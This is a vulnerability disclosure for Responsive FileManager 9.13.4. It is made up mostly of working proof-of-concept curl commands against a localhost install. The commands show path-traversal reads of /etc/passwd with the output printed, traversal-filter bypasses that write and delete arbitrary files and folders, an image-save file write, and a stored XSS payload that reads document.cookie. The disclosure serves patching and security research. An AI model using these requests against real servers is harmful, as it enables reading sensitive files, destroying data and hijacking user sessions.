@@ -1,0 +1,99 @@
+Responsive FileManager 9.13.4 - Multiple Vulnerabilities
+
+Date:
+  December 12, 2018
+
+Author:
+  farisv
+
+Vendor Homepage:
+  https://www.responsivefilemanager.com/
+
+Vulnerable Package Link:
+  https://github.com/trippo/ResponsiveFilemanager/releases/download/v9.13.4/responsive_filemanager.zip
+
+
+Responsive FileManager is a free open-source file manager and image manager made with the jQuery library, CSS3, PHP and HTML5 that offers a nice and elegant way to upload and insert files, images and videos.
+You can use it as external plugin for TinyMCE version 4.x (and older), CKEditor CLEditor, or you can also use it as a stand-alone file manager to manage and select files.
+
+The following are the vulnerabilities found before v 9.14.0.
+
+1. Arbitrary file read via path traversal with `path` parameter through `get_file` action in ajax_calls.php.
+
+$ curl -X POST -d "path=../../../../../../../etc/passwd" -H "Cookie: PHPSESSID=12k93hcuj6b7qt2jmnn40rd612" "http://localhost:1111/filemanager/ajax_calls.php?action=get_file&sub_action=edit&preview_mode=text"
+<textarea id="textfile_edit_area" style="width:100%;height:300px;">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+</textarea>%
+
+2. Arbitrary file read via path traversal with `path` parameter through `copy_cut` action in ajax_calls.php and `paste_clipboard` action in execute.php.
+
+# Copy/cut the file with directory traversal so the desired file path will be saved to the session.
+$ curl -X POST -d "sub_action=copy&path=../../../../../../../etc/passwd" -H "Cookie: PHPSESSID=12k93hcuj6b7qt2jmnn40rd612" "http://localhost:1111/filemanager/ajax_calls.php?action=copy_cut"
+
+# Paste the clipboard
+$ curl -X POST -d "path=" -H "Cookie: PHPSESSID=12k93hcuj6b7qt2jmnn40rd612" "http://localhost:1111/filemanager/execute.php?action=paste_clipboard"
+
+# File is in the `upload_dir` folder or in the dialog page.
+$ curl http://localhost:1111/source/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+
+3. Arbitrary file write via path traversal mitigation bypass through `create_file` action in execute.php.
+
+# We can bypass the directory traversal mitigation by using an array.
+$ curl -X POST -d "paths[0]=../../../../../../../../tmp/&names[0]=hacked.txt&new_content=Hacked" -H "Cookie: PHPSESSID=12k93hcuj6b7qt2jmnn40rd612" "http://localhost:1111/filemanager/execute.php?action=create_file"
+$ ls /tmp
+hacked.txt
+
+4. Arbitrary file deletion via path traversal mitigation bypass through `delete_file` action in execute.php.
+
+# We can bypass the directory traversal mitigation by using an array.
+$ curl -X POST -d "paths[0]=../../../../../../../../tmp/hacked.txt" -H "Cookie: PHPSESSID=12k93hcuj6b7qt2jmnn40rd612" "http://localhost:1111/filemanager/execute.php?action=delete_file"
+
+5. Arbitrary directory deletion via path traversal mitigation bypass through `delete_folder` action in execute.php.
+
+# We can bypass the directory traversal mitigation by using an array.
+$ curl -X POST -d "paths[0]=../filemanager" -H "Cookie: PHPSESSID=12k93hcuj6b7qt2jmnn40rd612" "http://localhost:1111/filemanager/execute.php?action=delete_folder"
+
+6. Arbitrary file write (only with jpg/jpeg/png extension) with `path` parameter through `save_img` action in ajax_calls.php.
+
+$ curl -X POST -d "path=../../../../../../../tmp/&name=hacked.jpg&url=http://s3.amazonaws.com/feather-files-aviary-prod-us-east-1/2444282ef4344e3dacdedc7a78f8877d/2018-10-23/44f0f34961464feb92b53d953b02d4bb.jpg" -H "Cookie: PHPSESSID=12k93hcuj6b7qt2jmnn40rd612" "http://localhost:1111/filemanager/ajax_calls.php?action=save_img"
+$ ls /tmp
+hacked.jpg
+
+7. Persistent XSS in `media_preview` action.
+
+Upload a file with valid media extension (e.g. mp3) with XSS payload in the name. For example, "a\"%2balert(document.cookie)%2b\"".mp3 will trigger `alert(document.cookie)` when previewed.
